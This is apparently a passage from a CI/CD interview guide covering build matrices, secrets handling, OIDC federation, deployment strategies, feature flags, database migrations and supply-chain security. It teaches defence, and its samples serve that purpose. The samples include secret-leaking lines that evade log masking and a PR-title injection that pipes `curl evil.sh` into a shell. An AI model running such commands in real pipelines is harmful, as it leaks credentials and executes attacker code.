# ---------- MATRIX: coverage across environments ----------
jobs:
  test:
    strategy:
      fail-fast: false          # get the full compatibility picture, not the first red
      max-parallel: 6           # do not starve every other pipeline in the org
      matrix:
        node: ['18', '20', '22']
        os: [ubuntu-latest, windows-latest]
        include:
          - node: '22'          # extra variable, only on this combination
            os: ubuntu-latest
            coverage: true
        exclude:
          - node: '18'
            os: windows-latest
    runs-on: ${{ matrix.os }}
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-node@v4
        with: { node-version: "${{ matrix.node }}", cache: npm }
      - run: npm ci && npm test
      - if: matrix.coverage
        run: npm run coverage

# ---------- SHARDING: same environment, split the test set ----------
  unit:
    strategy:
      fail-fast: false
      matrix:
        shard: [1, 2, 3, 4]
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - uses: actions/download-artifact@v4     # timings from the last main run
        with: { name: test-timings, path: .timings/ }
        continue-on-error: true
      - run: npm ci
      - run: npx jest --shard=${{ matrix.shard }}/4 --json --outputFile=t.json
      - uses: actions/upload-artifact@v4
        with: { name: timings-${{ matrix.shard }}, path: t.json }

# ---------- GitLab equivalents ----------
unit:
  parallel: 5                                  # CI_NODE_INDEX / CI_NODE_TOTAL
  script: [pytest --splits $CI_NODE_TOTAL --group $CI_NODE_INDEX]

compat:
  parallel:
    matrix:
      - PY: ['3.10', '3.11', '3.12']
        DB:  ['postgres:14', 'postgres:16']    # 6 jobs

deploy:
  retry:
    max: 2
    when: [runner_system_failure, api_failure]  # infra only. never script_failure.

# ---------- flake detection: same commit, many runs ----------
for i in $(seq 1 20); do
  npx jest --runInBand --json --outputFile="run-$i.json" || true
done
jq -s '[.[].testResults[].assertionResults[]] | group_by(.fullName)
       | map({name: .[0].fullName,
              fails: (map(select(.status=="failed")) | length),
              runs:  length})
       | map(select(.fails > 0 and .fails < .runs))' run-*.json
# anything listed both passed AND failed on identical code == flaky, by definition

sections.title: 12. Secrets in Pipelines: How They Leak and What Masking Cannot Do
sections.content:
CI is the most attractive target in most engineering organisations, because it is the one system holding credentials for every environment while also executing code that any engineer can change. Interviewers probe this hard.

**Where secrets live.** Every CI system offers an encrypted store — GitHub Actions repository/organisation/environment secrets, GitLab CI/CD variables, Jenkins Credentials, plus external managers like Vault, AWS Secrets Manager, and cloud KMS. The store gives you encryption at rest and access control. It does not give you anything else, and the interesting part is what happens after injection.

**Injection modes, from worst to best.** *Environment variables* are the default and the weakest: on Linux a process's environment is readable via `/proc/<pid>/environ` by the same user, it is inherited by every child process, it lands in core dumps, and any library that logs configuration on startup will print it. *Files* are better — a temporary file with mode 0600, deleted afterwards — because access is explicit and you can revoke by deleting. *Stdin* is better still for one-shot uses (`docker login --password-stdin` rather than `-p`, which would put the password in the process argument list where any user on the box can read it with `ps`). *No stored secret at all* is best: exchange a workload identity token for short-lived credentials at job start, which is the OIDC pattern in the next section.

**Masking is a log filter, not a security boundary.** All three major systems scan the log stream and replace known secret values with asterisks. This catches accidental `echo $TOKEN` and nothing else. It is defeated by, among other things: printing the value base64-encoded or hex-encoded; printing it one character at a time or with an inserted separator; the value appearing inside a JSON blob that gets pretty-printed with escaping; writing it to a file that is then uploaded as an artifact; sending it to an external service; and any transformation at all. Masking also has prerequisites — GitLab will refuse to mask a variable that does not meet its length and character-set requirements, which means a short or oddly-formatted secret is silently *not* masked. The mental model to state in an interview: masking prevents accidents, not attacks. If untrusted code runs in a job, every secret available to that job must be considered disclosed.

**Blast radius is the real control.** Since a secret exposed to a job is a secret that job's code can exfiltrate, the design goal is minimising what any given job can reach. Scope secrets to environments rather than the repository, so a job running against `staging` cannot read production credentials. Scope them per repository rather than per organisation. Give the pipeline's cloud role only the permissions that pipeline needs, and separate the role that *builds* from the role that *deploys*. Make credentials short-lived so a leaked value has a small window. Above all, prefer credentials that are worthless outside the intended context — a token that only works when presented from your CI's identity, only for one repository, only for one action.

**Fork pull requests are the classic hole.** On GitHub, workflows triggered by `pull_request` from a fork get a read-only `GITHUB_TOKEN` and **no secrets** — precisely because the PR contains attacker-controlled code. `pull_request_target`, by contrast, runs the workflow definition from the *base* branch with a writable token and full secret access, which is safe only if you never check out or execute the PR's code. The catastrophic pattern is `pull_request_target` combined with `actions/checkout` of `github.event.pull_request.head.sha` followed by any build step: that is arbitrary code execution with your production secrets, triggerable by a stranger. If you need to run untrusted PR code and then do something privileged, split it: an unprivileged job builds and uploads an artifact, and a separate `workflow_run`-triggered job with the secrets consumes only that artifact and never executes PR-supplied code.

**Rotation and detection.** Assume leakage will happen. Enable secret scanning with push protection so credentials are blocked before they enter history; run `gitleaks` or `trufflehog` in the pipeline over the diff. When a secret does leak, **rotate it** — rewriting Git history does not help, because forks, clones, caches, CDN copies, and log aggregators already have it. Rotation should be routine and automated, not an incident-only procedure, because a rotation path you have never exercised will not work the day you need it at 3 a.m.
sections.code:
# ---------- how secrets actually leak ----------
docker login -u user -p "$PASSWORD"      # BAD: visible in `ps aux` to any local user
echo "$PASSWORD" | docker login -u user --password-stdin   # GOOD

curl -H "Authorization: Bearer $TOKEN" ...          # ok
curl -v -H "Authorization: Bearer $TOKEN" ...       # BAD: -v prints headers
set -x                                              # BAD: traces every expansion

echo "$TOKEN" | base64        # masking will NOT catch this
echo "${TOKEN:0:10}"          # masking will NOT catch a substring
env > env.txt && upload env.txt  # masking does not inspect artifacts

# ---------- GitHub Actions: least privilege + environment scoping ----------
permissions:
  contents: read              # NOT write-all
jobs:
  deploy:
    environment: production   # PROD_KEY is scoped to this environment only;
    runs-on: ubuntu-latest    # a staging job literally cannot read it
    steps:
      - env:
          API_KEY: ${{ secrets.PROD_API_KEY }}   # pass via env, never inline in run:
        run: ./deploy.sh

# ---------- the fork-PR trap ----------
# DANGEROUS: base-branch workflow, full secrets, executing the PR's code.
on: pull_request_target
jobs:
  bad:
    steps:
      - uses: actions/checkout@v4
        with: { ref: ${{ github.event.pull_request.head.sha }} }   # attacker code
      - run: npm ci && npm run build      # arbitrary RCE with your prod secrets
                                          # (npm lifecycle scripts alone suffice)

# SAFE split: untrusted build has no secrets; privileged job never runs PR code.
#   workflow A: on: pull_request        -> build, upload artifact, NO secrets
#   workflow B: on: workflow_run        -> download artifact, publish, HAS secrets

# ---------- Vault: fetch short-lived, never store long-lived ----------
export VAULT_TOKEN=$(vault write -field=token auth/jwt/login \
  role=ci-deploy jwt="$CI_JOB_JWT")
# dynamic DB credential that Vault revokes automatically when the lease expires
vault read -format=json database/creds/app-ci | jq -r '.data.password'

# ---------- catch it before it lands ----------
gitleaks detect --source . --redact --exit-code 1
gitleaks protect --staged --redact --exit-code 1   # as a pre-commit hook

sections.title: 13. OIDC Workload Identity: Killing Long-Lived Cloud Keys
sections.content:
"Why is OIDC better than storing an AWS access key in CI?" is now a standard interview question, and the strong answer explains the token exchange rather than repeating "it's more secure."

**The problem with a stored key.** An `AKIA...` access key plus secret is a *bearer* credential: whoever holds the string is the identity, forever, from anywhere. It sits in your CI's secret store, in someone's local `.env` from when they debugged the pipeline, in a Terraform state file, and in whatever logs it accidentally landed in. It does not expire. Rotating it means coordinating across every consumer, so in practice nobody rotates it. You cannot tell from CloudTrail whether a call came from your pipeline or from an attacker with the same string. This is the credential class behind a large share of real cloud breaches.

**What OIDC federation replaces it with.** The CI platform runs an OIDC identity provider. During a job, the runner can request a short-lived, cryptographically signed JWT that *describes the job*: which repository, which ref, which environment, which workflow, which actor, plus an audience and a few minutes of validity. The cloud provider is configured to trust that issuer's public keys (fetched from the issuer's JWKS endpoint, discovered via `/.well-known/openid-configuration`) and to map claims in the token to a role. The job presents the JWT; the cloud validates the signature, the issuer, the audience, and the expiry; checks the claim conditions in the role's trust policy; and returns temporary credentials.

The properties that follow are the answer to the question. **Nothing long-lived is stored anywhere** — there is no secret in the CI store to leak. **The token expires in minutes**, so a leaked one is nearly worthless. **The token is audience-bound**, so a token minted for AWS cannot be replayed against GCP. **Authorisation is claim-based**, so the cloud can enforce "only the `main` branch of `acme/api`, and only when running against the `production` environment." And the identity is *attested by the platform*, not asserted by the caller — a job cannot forge a `sub` claim describing a different repository, because it never signs the token.

**The trust policy is where people get this catastrophically wrong.** The role must condition on both `aud` and `sub`. Two real misconfigurations:

1. Conditioning only on `aud`. Every GitHub Actions job on the entire platform receives a token with audience `sts.amazonaws.com`. A trust policy that checks only the audience means *anyone in the world* can create a repository, run a workflow, and assume your role. This has happened to real companies.
2. A sloppy `sub` wildcard. `repo:acme/*` trusts every repository in your org, including a low-trust sandbox one. `repo:acme/api:*` trusts *every ref* in that repo — so any engineer who can push a branch (or open a PR that runs workflows) can mint production credentials. Constrain to a specific ref (`repo:acme/api:ref:refs/heads/main`) or, better, to an environment (`repo:acme/api:environment:production`), because GitHub environments can require human approval and restrict which branches may deploy. Then the IAM condition and the GitHub protection rule reinforce each other.

**Mechanics per platform.** GitHub Actions: the job needs `permissions: id-token: write`; the runner exposes `ACTIONS_ID_TOKEN_REQUEST_URL` and `ACTIONS_ID_TOKEN_REQUEST_TOKEN`, and `aws-actions/configure-aws-credentials@v4` (or `google-github-actions/auth@v2`, or `azure/login@v2`) does the exchange for you. GitLab: declare `id_tokens:` with an `aud`, and the JWT appears in the variable you named. Jenkins can use the OIDC provider plugin or Vault's JWT auth method. On the cloud side: AWS uses an IAM OIDC identity provider plus a role trust policy with `sts:AssumeRoleWithWebIdentity`; GCP uses Workload Identity Federation with a pool, a provider, and an attribute condition; Azure uses federated credentials on an app registration.

**Where OIDC does not apply.** It solves machine-to-cloud auth. It does not solve secrets that are inherently long-lived shared strings — a third-party API key, a database password for a system with no federation support. For those, shorten the lifetime some other way: Vault dynamic secrets that mint a per-job database user with a lease, or a cloud secrets manager fronted by the OIDC-derived role, so the *only* thing the pipeline holds is a short-lived identity and everything else is fetched with it.
sections.code:
# ---------- GitHub Actions -> AWS, no stored keys ----------
permissions:
  id-token: write        # REQUIRED: lets the job request the OIDC JWT
  contents: read

jobs:
  deploy:
    runs-on: ubuntu-latest
    environment: production          # puts environment:production in the sub claim
    steps:
      - uses: aws-actions/configure-aws-credentials@v4
        with:
          role-to-assume: arn:aws:iam::111122223333:role/gha-deploy
          aws-region: eu-west-1
          role-duration-seconds: 900 # 15 minutes is plenty for a deploy
      - run: aws sts get-caller-identity

# ---------- the IAM trust policy: the part that matters ----------
{
  "Version": "2012-10-17",
  "Statement": [{
    "Effect": "Allow",
    "Principal": {
      "Federated": "arn:aws:iam::111122223333:oidc-provider/token.actions.githubusercontent.com"
    },
    "Action": "sts:AssumeRoleWithWebIdentity",
    "Condition": {
      "StringEquals": {
        "token.actions.githubusercontent.com:aud": "sts.amazonaws.com",
        "token.actions.githubusercontent.com:sub":
          "repo:acme/api:environment:production"
      }
    }
  }]
}
# WRONG #1: omit the :sub condition -> ANY GitHub repo on earth can assume this role.
# WRONG #2: "sub": "repo:acme/*"     -> any repo in the org, including sandboxes.
# WRONG #3: "sub": "repo:acme/api:*" -> any branch/PR in that repo can reach prod.
# If you must use StringLike, pin the ref:  "repo:acme/api:ref:refs/heads/main"

# ---------- what the JWT actually contains ----------
{
  "iss": "https://token.actions.githubusercontent.com",
  "aud": "sts.amazonaws.com",
  "sub": "repo:acme/api:environment:production",
  "repository": "acme/api",
  "ref": "refs/heads/main",
  "sha": "9f2b1c...",
  "workflow": "deploy",
  "actor": "someone",
  "runner_environment": "github-hosted",
  "exp": 1735689600
}
# Signed by GitHub. The job cannot alter these claims; it never holds the key.

# ---------- GitLab CI ----------
deploy:
  id_tokens:
    AWS_ID_TOKEN:
      aud: https://gitlab.example.com     # must match the IAM aud condition
  script:
    - >
      CREDS=$(aws sts assume-role-with-web-identity
        --role-arn "$ROLE_ARN" --role-session-name "gl-$CI_JOB_ID"
        --web-identity-token "$AWS_ID_TOKEN" --duration-seconds 900)
    - export AWS_ACCESS_KEY_ID=$(echo "$CREDS" | jq -r .Credentials.AccessKeyId)
    - export AWS_SECRET_ACCESS_KEY=$(echo "$CREDS" | jq -r .Credentials.SecretAccessKey)
    - export AWS_SESSION_TOKEN=$(echo "$CREDS" | jq -r .Credentials.SessionToken)

# ---------- GCP Workload Identity Federation ----------
- uses: google-github-actions/auth@v2
  with:
    workload_identity_provider: projects/123/locations/global/workloadIdentityPools/gh/providers/gh
    service_account: deployer@my-project.iam.gserviceaccount.com
# and the provider MUST carry an attribute condition, e.g.
#   attribute.repository == 'acme/api' && attribute.ref == 'refs/heads/main'

sections.title: 14. Deployment Strategies: Rolling, Blue-Green, Canary, Shadow
sections.content:
Every deployment strategy is answering the same question — *how do we replace running version A with version B without a visible outage and without betting everything on one moment* — and each makes a different trade between capacity cost, rollback speed, and blast radius.

**Recreate** (stop all A, start all B) is the baseline: simple, brief total outage, no version skew. Legitimate when downtime is acceptable or when A and B genuinely cannot coexist, for example a non-backward-compatible schema change on a single-writer system.

**Rolling** replaces instances in batches. Kubernetes implements it natively: a Deployment's `RollingUpdate` strategy has `maxSurge` (how many extra pods above the desired count may exist, default 25%) and `maxUnavailable` (how many below, default 25%). The controller creates new-version pods, waits for their **readiness probes** to pass, then terminates old ones, repeating until done. The readiness probe is the entire safety mechanism — without a meaningful one, Kubernetes considers a pod ready the instant the process starts, and it will happily roll a broken build across the whole fleet in seconds. Two more knobs matter: `minReadySeconds` forces a pod to stay healthy for N seconds before counting as available (catching crashes that occur just after startup), and `progressDeadlineSeconds` (default 600) marks the rollout failed if it makes no progress. The defining property of rolling is that **both versions serve traffic simultaneously**, so A and B must be mutually compatible — same API contract, same message formats, same database schema. Rollback is another rolling update in reverse, so it is not instant. Capacity cost is near zero.

**Blue-green** runs two complete environments. Blue serves production; green receives the new version and is fully tested while receiving no real traffic. Cutover flips a router — a load balancer target group, a Kubernetes Service selector, an ingress weight — so all traffic moves at once. Rollback is flipping back, which is as close to instant as you get, and that is the whole point. Costs: double the infrastructure during the transition, and the cutover is atomic for *new* connections but not for state — in-flight requests, WebSockets, and anything sticky needs a drain policy, and both colours usually share one database, so schema compatibility is still mandatory. DNS-based cutover deserves a specific warning: TTLs are advisory and resolvers, JVMs, and connection pools cache aggressively, so "instant rollback" can mean forty minutes of stragglers. Flip at the load balancer, not in DNS.

**Canary** sends a small fraction of real traffic to the new version, watches health signals, then ramps. The mechanism can be replica-count-based (2 of 20 pods run the new version behind one Service, so roughly 10% of traffic — crude, but it needs no extra infrastructure) or weight-based via a mesh or ingress that can split 1%/99% precisely and can route by header or user cohort. What makes canary *canary* rather than "a slow rollout" is the **automated analysis**: during each step, query the SLIs — error rate, p99 latency, saturation — for the canary population and compare them against the baseline population *measured over the same window*, then promote or roll back automatically. Comparing canary-now against baseline-an-hour-ago is a mistake, because it attributes normal diurnal variation to your deploy. Argo Rollouts and Flagger implement exactly this loop. The limits worth naming: 1% of traffic may not produce enough events to detect a 0.5% error-rate regression in ten minutes (you need a statistically meaningful sample, so low-traffic services must either use longer windows or accept less sensitivity), and a canary catches only what your metrics can see — a slow data-corruption bug passes every gate.

**Shadow / traffic mirroring** sends a copy of production requests to the new version and discards its responses. It exercises the new version against real traffic patterns with zero user risk, which is excellent for validating performance and resource usage. The hard constraint: the shadowed version must not cause side effects — no writes, no charges, no emails, no messages published to real topics — which usually means pointing it at a separate datastore and stubbing outbound integrations. It also roughly doubles backend load.

Real systems combine these. A common production pattern is blue-green at the *deployment* level (both versions present) with canary at the *traffic* level (weights ramped by an automated analysis), plus feature flags inside the new version so individual behaviours can be turned off without touching the deployment at all.
sections.code:
# ---------- ROLLING (Kubernetes native) ----------
apiVersion: apps/v1
kind: Deployment
metadata: { name: api }
spec:
  replicas: 10
  revisionHistoryLimit: 10          # how many old ReplicaSets are kept for undo
  minReadySeconds: 15               # must stay healthy 15s before counting ready
  progressDeadlineSeconds: 600      # rollout marked Failed if stalled this long
  strategy:
    type: RollingUpdate
    rollingUpdate:
      maxSurge: 2                   # at most 12 pods during the roll
      maxUnavailable: 0             # never dip below 10 -> no capacity loss
  template:
    spec:
      containers:
        - name: api
          image: ghcr.io/acme/api@sha256:<digest>
          readinessProbe:           # THE safety mechanism for a rolling update
            httpGet: { path: /readyz, port: 8080 }
            periodSeconds: 5
            failureThreshold: 3
          livenessProbe:            # restarts a wedged process; NOT a rollout gate
            httpGet: { path: /livez, port: 8080 }
            periodSeconds: 10
            failureThreshold: 3
          lifecycle:
            preStop:                # let the LB deregister before the process dies
              exec: { command: ["sleep", "10"] }
      terminationGracePeriodSeconds: 45

# readyz should report dependency health; livez should report only "am I wedged".
# Wiring a database check into livez turns a DB blip into a cluster-wide restart storm.

# ---------- BLUE-GREEN: cut over by changing a Service selector ----------
kubectl apply -f deploy-green.yaml                 # version: green, 0 traffic
kubectl rollout status deploy/api-green --timeout=300s
./smoke-test.sh http://api-green.internal          # test with real infra, no users
kubectl patch service api -p \
  '{"spec":{"selector":{"app":"api","version":"green"}}}'   # atomic flip
# rollback = patch the selector back to blue. Seconds, and guaranteed.

# ---------- CANARY with automated analysis (Argo Rollouts) ----------
apiVersion: argoproj.io/v1alpha1
kind: Rollout
metadata: { name: api }
spec:
  strategy:
    canary:
      canaryService: api-canary
      stableService: api-stable
      trafficRouting:
        istio: { virtualServices: [{ name: api-vs }] }
      analysis:
        templates: [{ templateName: error-rate }]
        startingStep: 1                     # analyse from the 5% step onward
      steps:
        - setWeight: 5
        - pause: { duration: 10m }
        - setWeight: 25
        - pause: { duration: 10m }
        - setWeight: 50
        - pause: { duration: 10m }
        - setWeight: 100
---
apiVersion: argoproj.io/v1alpha1
kind: AnalysisTemplate
metadata: { name: error-rate }
spec:
  metrics:
    - name: error-rate
      interval: 1m
      failureLimit: 2                       # 2 bad intervals -> automatic abort
      provider:
        prometheus:
          address: http://prometheus:9090
          # canary population only, compared against its own SLO threshold
          query: |
            sum(rate(http_requests_total{job="api",version="canary",code=~"5.."}[2m]))
            /
            sum(rate(http_requests_total{job="api",version="canary"}[2m]))
      successCondition: result[0] < 0.01

# ---------- SHADOW (Istio): mirror 100% of traffic, discard responses ----------
apiVersion: networking.istio.io/v1beta1
kind: VirtualService
spec:
  http:
    - route:
        - destination: { host: api, subset: stable }
          weight: 100
      mirror: { host: api, subset: candidate }
      mirrorPercentage: { value: 100 }
# candidate MUST be side-effect free: read-only DB replica, stubbed outbound calls.

sections.title: 15. Feature Flags: Decoupling Deploy from Release
sections.content:
A feature flag is a runtime conditional whose value comes from configuration rather than code. That sounds trivial; the consequence is not. Flags break the identity between *deploy* (new code is running on servers) and *release* (users experience new behaviour), and once those are separate, most of the risk of shipping evaporates.

**What that buys you.** Incomplete work can merge to trunk behind a flag that is off, so you get real continuous integration without long-lived branches — the flag is what makes trunk-based development possible on features that take three weeks. Release becomes a config change measured in seconds, so the panic move during an incident is flipping a flag rather than running a deploy pipeline. Rollout can be gradual and targeted along dimensions your deployment system cannot express: 1% of users, internal employees only, one tenant, one region, users in a particular plan. And the same mechanism gives you A/B experiments almost for free, since you already have per-user assignment and consistent bucketing.

**How evaluation actually works.** A flag system has a control plane (where you set rules) and an evaluation point. The critical design decision is *where* evaluation happens. **Server-side evaluation** — the SDK holds the ruleset in memory, refreshed by streaming or polling, and evaluates locally — is what production systems use, because it adds no network hop to the request path, works when the flag service is unreachable (it serves the last known ruleset, or a compiled-in default), and never ships targeting rules to a client where they could be inspected. Evaluating by calling a remote service per request puts a third-party availability dependency in your hot path; that is how a flag system takes down the product it was meant to protect. Consistency matters too: assignment is normally `hash(flag_key + user_id) % 100 < rollout_percentage`, so a given user sees the same variant on every request and across services, which is what makes a partial rollout debuggable and an experiment valid.

**The failure modes.** *Flag debt* is the big one. Every flag is a branch in your control flow, so N flags mean up to 2^N behavioural combinations, of which you test maybe three. Teams that do not remove flags end up with code nobody can reason about and a test suite that covers a vanishing fraction of reachable states. The discipline: every release flag gets an owner and an expiry date at creation, a scheduled job reports flags that have been at 100% (or 0%) for more than a few weeks, and removing the flag is a tracked task in the same epic that added it. Distinguish flag *kinds*, because they have different lifetimes: release toggles (days to weeks, then delete), experiment flags (the duration of the experiment), operational kill switches (permanent by design — the switch that sheds a non-essential feature under load), and permission/entitlement flags (permanent, and really part of your product model rather than deployment machinery).

*Stale defaults* are the sharp edge in an incident. What does your code do when the flag service is unreachable at process start, before any ruleset has been fetched? The answer must be a deliberate, compiled-in default per flag, chosen so the safe path is the fallback. A flag defaulting to "on" for a half-finished feature turns a flag-service outage into a product outage.

*Untested combinations* and *flags in the data layer*. Testing every combination is impossible, so at minimum run your test suite in the production configuration and in the fully-flipped configuration, and test the specific combinations you intend to ship together. And be careful with flags that change what you *write*, not just what you read: a flag that switches a write path leaves persistent data in two shapes, so turning it off does not undo the effect — that is a migration, not a toggle, and it needs the expand-contract treatment from the next section.

**Flags versus deployment strategies.** They are complementary and operate at different layers. Canary controls which *instances or requests* hit the new binary; flags control which *users* get the new behaviour on any binary. Flags cannot protect you from changes that are not conditional — a dependency upgrade, a JVM change, a rewritten serialization path — so you still need progressive delivery underneath. The strongest setups use both: deploy the binary progressively with automated metric gates, then release the behaviour independently with a flag you can flip in one second without a pipeline run.

sections.title: 16. Rollback, Database Migrations, and the Expand-Contract Pattern
sections.content:
Rollback is the part of CI/CD that people design last and need most. The interview question is usually "a deploy has broken production — walk me through what you do," and the strong answer starts by distinguishing rollback from forward-fix, then immediately raises the database.

**Roll back by default; forward-fix by exception.** During an incident, the goal is to stop the bleeding, not to be right. A rollback returns you to a state that demonstrably worked; a forward fix requires writing correct code under time pressure, reviewing it properly, and running it through a full pipeline — all while the incident continues. So the default is rollback. The exceptions are real, though: when the change is not reversible (a data migration has already run, an external partner has been notified, a message has been consumed from a queue and acknowledged), when rolling back would itself cause harm (the old version writes a format the new consumers can no longer read), or when the fix is genuinely a one-line config change that is faster and lower risk than a rollback. Name those exceptions in the interview — a candidate who says "always roll back" has not met a schema change.

**What makes rollback fast is a property of the deployment system, not a script.** If artifacts are immutable and versioned, and deployment means pointing at a digest, rollback is a control-plane operation: `kubectl rollout undo`, flipping a blue-green selector, or reverting a commit in a GitOps config repo. If deployment means "run the build again from the previous tag," rollback takes as long as a build and might not reproduce. This is why the build-once rule and the rollback story are the same conversation. Practical requirements: keep enough revision history (`revisionHistoryLimit` in Kubernetes; retention policy in your registry that never deletes the running or last-known-good version), make deploys idempotent, and — the one everybody skips — **rehearse rollback on a schedule**. An untested rollback path is a hypothesis, and the day you test it for the first time is the worst possible day.

**The database is what makes rollback hard.** Code is stateless and interchangeable; the database has one copy of the truth and it remembers. Three rules follow. (1) **Never couple a schema change to an application deploy in a way that requires them to happen atomically** — they cannot, because during any rolling deploy both versions run at once. (2) **Every migration must be backward compatible with the previous application version**, which is precisely the condition that makes rollback possible. (3) **Never restore a database backup to "roll back"** unless you have accepted the data loss; every write since the backup is gone, and in a payment or messaging system that is worse than the bug.

**Expand-contract (also called parallel change) is the pattern that satisfies those rules.** Rename a column from `name` to `full_name` across five independently deployable steps, each of which is individually safe to roll back:

```
1. EXPAND   add full_name (nullable). Deploy code that WRITES BOTH, READS name.
            -> old version still works; new version still works. Reversible.
2. BACKFILL copy name -> full_name in batches. No code change. Reversible.
3. SWITCH   deploy code that READS full_name, still WRITES BOTH.
            -> rollback to step 1 code still works, both columns are populated.
4. STOP     deploy code that reads and writes ONLY full_name.
            -> now `name` is stale; rolling back past this point loses writes.
5. CONTRACT drop column name. Separate deploy, days later, once step 4 is proven.
```

Each step is a separate deploy. The property that makes this work is that at every point, the version currently running and the version you would roll back to can both operate against the current schema. The cost is five deploys instead of one, and the discipline to actually do step 5 rather than leaving dead columns forever.

**Migration mechanics that bite in production.** Run migrations as a distinct pipeline step with its own gate, not from application startup — startup migrations mean N pods racing to run the same DDL, and a failed migration becomes a crash loop. Use advisory locks or a migration tool that takes one (Flyway, Liquibase, Alembic, golang-migrate all do). Make migrations non-blocking: on PostgreSQL, use `CREATE INDEX CONCURRENTLY` rather than `CREATE INDEX` (which takes a lock that blocks writes for the duration), add columns as nullable without a volatile default, and set a short `lock_timeout` so a DDL statement that cannot get its lock fails fast instead of queueing — an `ALTER TABLE` waiting on a long-running transaction blocks every subsequent query on that table, which turns a five-second migration into a full outage. Backfill in bounded batches with a sleep between them, never as one giant `UPDATE` that holds a transaction open across millions of rows and bloats the write-ahead log.
sections.code:
# ---------- fast rollback needs an immutable, addressable previous version ----------
kubectl rollout history deploy/api
kubectl rollout undo deploy/api                    # -> previous ReplicaSet
kubectl rollout undo deploy/api --to-revision=7    # -> a specific one
kubectl rollout status deploy/api --timeout=120s

# GitOps equivalent: revert the commit, let the reconciler converge.
git revert <deploy-commit> && git push       # auditable, reviewable, reproducible

# Blue-green rollback: flip the selector back. Seconds.
kubectl patch svc api -p '{"spec":{"selector":{"version":"blue"}}}'

# Pause a bad rolling update mid-flight instead of letting it finish:
kubectl rollout pause deploy/api
kubectl rollout undo  deploy/api
kubectl rollout resume deploy/api

# ---------- EXPAND-CONTRACT, step by step ----------
-- Step 1: EXPAND. Additive only. Old code is unaffected.
ALTER TABLE users ADD COLUMN full_name text;      -- nullable, no default: fast
-- app v2 deployed: writes name AND full_name, reads name.

-- Step 2: BACKFILL in bounded batches. Never one giant UPDATE.
DO $$
DECLARE rows int;
BEGIN
  LOOP
    UPDATE users SET full_name = name
     WHERE id IN (SELECT id FROM users
                   WHERE full_name IS NULL AND name IS NOT NULL
                   LIMIT 5000 FOR UPDATE SKIP LOCKED);
    GET DIAGNOSTICS rows = ROW_COUNT;
    EXIT WHEN rows = 0;
    COMMIT;                       -- short transactions; no WAL blowup, no long locks
    PERFORM pg_sleep(0.1);        -- leave headroom for production traffic
  END LOOP;
END $$;

-- Step 3: SWITCH. app v3 reads full_name, still writes both. Rollback to v2 is safe.
-- Step 4: STOP.   app v4 reads and writes only full_name.
--                 (rolling back past this point starts losing writes to `name`)
-- Step 5: CONTRACT, days later, once v4 is proven:
ALTER TABLE users DROP COLUMN name;

# ---------- non-blocking DDL on PostgreSQL ----------
SET lock_timeout = '3s';          -- fail fast rather than queueing behind a long txn
CREATE INDEX CONCURRENTLY idx_users_full_name ON users (full_name);
-- CONCURRENTLY cannot run inside a transaction block, and can leave an INVALID
-- index if it fails; the migration must detect and DROP+retry that case.

-- Adding NOT NULL without a full-table rewrite: validate separately.
ALTER TABLE users ADD CONSTRAINT users_full_name_nn
  CHECK (full_name IS NOT NULL) NOT VALID;        -- instant, no scan
ALTER TABLE users VALIDATE CONSTRAINT users_full_name_nn;  -- scans, weaker lock

# ---------- migrations belong in the pipeline, not in app startup ----------
# N pods racing the same DDL, with a failed migration turning into a crash loop,
# is a self-inflicted outage. Run it once, with a lock, as its own gated step:
#   job: migrate  (single run, advisory-locked, its own approval)
#   job: deploy   (needs: migrate)

sections.title: 17. Pipeline Supply-Chain Security: Pinning, Untrusted Input, Provenance
sections.content:
Your CI system builds the artifact that runs in production and holds credentials for every environment. That makes it the highest-value target you own, and attackers know it. The threats are specific and the mitigations are concrete.

**Untrusted code execution.** The base question for any pipeline is: *can code I do not control execute in a context that has secrets?* Three common yes-answers. Fork pull requests running on self-hosted runners. `pull_request_target` workflows that check out and build the PR head. And dependency installation itself — `npm install` runs arbitrary `postinstall` scripts from every package in the tree, so "we only build the PR, we don't run its tests" is not a defence. The structural fix is the two-workflow split: an unprivileged job builds untrusted code with no secrets and uploads an artifact; a separate privileged workflow, triggered by that run's completion, consumes only the artifact.

**Script injection.** In GitHub Actions, `${{ }}` is substituted into the script text before the shell runs. If a workflow contains `run: echo "Title: ${{ github.event.pull_request.title }}"`, then a PR titled ``a"; curl evil.sh | sh; #`` becomes shell code executing on your runner with the job's token. Any `github.event.*` field that a user can write is attacker-controlled: PR titles and bodies, branch names, issue comments, commit messages, review bodies. The fix is uniform — bind the value to an environment variable via `env:` and reference `"$TITLE"` in the script. The value then travels as data through the environment rather than being spliced into the program text. Same principle as SQL parameterisation.

**Mutable action references.** `uses: some/action@v3` resolves a Git tag, and tags are movable pointers in the referenced repository. If that repository is compromised, or its maintainer's account is, the attacker re-points `v3` at a malicious commit and every workflow in the world using `@v3` runs their code on the next execution. This is not theoretical: in March 2025 the widely used `tj-actions/changed-files` action was compromised and its version tags were re-pointed at a commit that dumped CI runner memory — including secrets — into workflow logs, affecting thousands of repositories. The mitigation is to **pin third-party actions to a full 40-character commit SHA** (`uses: some/action@a1b2c3...` with the version in a trailing comment), because a SHA is content-addressed and cannot be re-pointed. Dependabot and Renovate both understand SHA pins and will raise PRs to bump them, so you keep updates without keeping the mutability. Beyond pinning: minimise the number of third-party actions, vendor critical ones into your own org, and enable the repository setting that restricts which actions may run at all.

**Over-privileged tokens.** `GITHUB_TOKEN` defaults can be organisation-wide read-write; set them to read-only and grant per-job `permissions:` explicitly. A job that only runs tests needs `contents: read` and nothing more. The same applies to cloud roles: separate the build role from the deploy role, and scope deploy roles per environment. This does not prevent compromise; it bounds it, which is the realistic goal.

**Runner isolation.** Self-hosted runners must be ephemeral (destroyed after one job), non-privileged, network-restricted (deny egress to your cloud metadata endpoint in particular — `169.254.169.254` is how a compromised job steals the host's instance role), and never shared between trust tiers. A runner pool used by both a public repo and your production deployment repo is a single hop from stranger to production.

**Dependency integrity.** Use lockfiles and *lockfile-respecting* install commands (`npm ci`, `pip install --require-hashes -r requirements.txt`, `go mod verify` with `GOFLAGS=-mod=readonly`, `bundle install --frozen`). Understand dependency confusion: if your internal package `@acme/utils` is not registered publicly and your resolver checks a public registry first, an attacker who publishes that name publicly at a higher version can get their code installed. Scope internal packages and configure the resolver so internal names never fall through to public sources.

